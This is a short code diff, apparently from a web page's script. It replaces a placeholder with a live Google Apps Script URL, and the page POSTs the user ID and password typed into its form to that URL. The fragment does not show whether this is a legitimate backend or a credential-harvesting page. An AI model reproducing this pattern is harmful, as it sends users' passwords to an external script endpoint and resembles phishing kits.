@@ -113,7 +113,7 @@
             formData.append('user', document.getElementById('userId').value);
             formData.append('pass', document.getElementById('password').value);
 
-            fetch('YOUR_GAS_DEPLOYMENT_URL', {
+            fetch('https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec', {
                 method: 'POST',
                 body: formData
             })
